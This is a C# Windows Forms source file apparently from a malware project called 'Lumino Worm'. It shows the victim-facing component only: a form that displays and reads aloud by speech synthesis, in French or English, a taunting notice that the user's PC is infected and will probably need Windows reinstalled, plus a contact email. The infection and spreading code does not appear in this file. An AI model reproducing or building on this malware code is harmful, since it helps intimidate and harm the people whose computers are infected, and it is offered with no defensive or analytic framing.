using System;
using System.Security.Cryptography.X509Certificates;
using System.Speech.Synthesis;
using System.Threading;
using System.Windows.Forms;
using Lumino_worm;
using Lumino_worm.Properties;

namespace MSG_BoxCustom
{
    public partial class MSG_BoxCustom1 : Form
    {
        public MSG_BoxCustom1()
        {
            InitializeComponent();
        }
        

        public void Form2_Load(object sender, EventArgs e)
        {
           
        }

        private readonly Speaker Language_Spaker = new Speaker();
        private void button1_Click(object sender, EventArgs e)
        {
            Thread French_speaker = new Thread(Language_Spaker.French_Speaker);
            French_speaker.Start();
            MessageBox.Show("Salut, ton pc à été infecter par le virus Lumino Worm. Je suis désolé mais faudra surement réinstaller Windows SAUF SI tu t'y connais en informatique et que tu trouve la faille, mhoa hahaha. Non sérieusement, bon courage à toi.", "Lumino Worm", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Thread English_speaker = new Thread(Language_Spaker.English_Speaker);
            English_speaker.Start();
            MessageBox.Show("Hi, your pc was afected by the Lumino Worm's virus. I am so sorry but surely need to reinstall Windows UNLESS if you have some knowledge in informatic and that you find the flaw, mhoa hahaha. No seriously, good luck to you.", "Lumino Worm", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }

        private readonly Couriel courielnew = new Couriel();
        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            try
            {
                courielnew.Activate();
                courielnew.Show();
            }
            catch(SystemException) { }
           
        }


        private void hELPToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("EN: \rSend me a mail at : keyluminer@gmail.com\r \rFR:\rEnvoyez-moi un mail a : keyluminer@gmail.com", "Lumino Worm", MessageBoxButtons.OK, MessageBoxIcon.Question);
        }

        
      
    }

    public class Speaker
    {
        public void French_Speaker()
        {
            var synthesizer = new SpeechSynthesizer();
            synthesizer.SetOutputToDefaultAudioDevice();
            synthesizer.Speak("Salut, ton pc à été infecter par le virus Lumino Worm. Je suis désolé mais faudra surement réinstaller Windows SAUF SI tu t'y connais en informatique et que tu trouve la faille, mhoa hahaha. Non sérieusement, bon courage à toi. Profite de les musiques que j'aime bien.");
        }

        public void English_Speaker()
        {
            var synthesizer = new SpeechSynthesizer();
            synthesizer.SetOutputToDefaultAudioDevice();
            synthesizer.Speak("Hi, your pc was afected by the Lumino Worm's virus. I am so sorry but surely need to reinstall Windows UNLESS if you have some knowledge in informatic and that you find the flaw, mhoa hahaha. No seriously, good luck to you. Enjoy the musics that i like.");
        }
    }

}
